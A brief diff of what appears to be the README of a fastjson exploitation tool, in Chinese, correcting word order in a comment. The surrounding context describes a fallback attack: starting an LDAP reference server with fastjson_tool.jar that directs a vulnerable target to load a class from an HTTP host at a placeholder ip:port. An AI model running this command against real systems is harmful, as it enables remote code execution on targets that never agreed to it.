@@ -41,7 +41,7 @@ User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_1 like Mac OS X)
 
 else:
 有些环境可能利用不成功，可以尝试默认的攻击方法,
-例如，启动ldap服务，从获取http服务class
+例如，启动ldap服务，从http服务获取class
 java -cp fastjson_tool.jar LDAPRefServer http://ip:port/#Object 8888
 
 ```
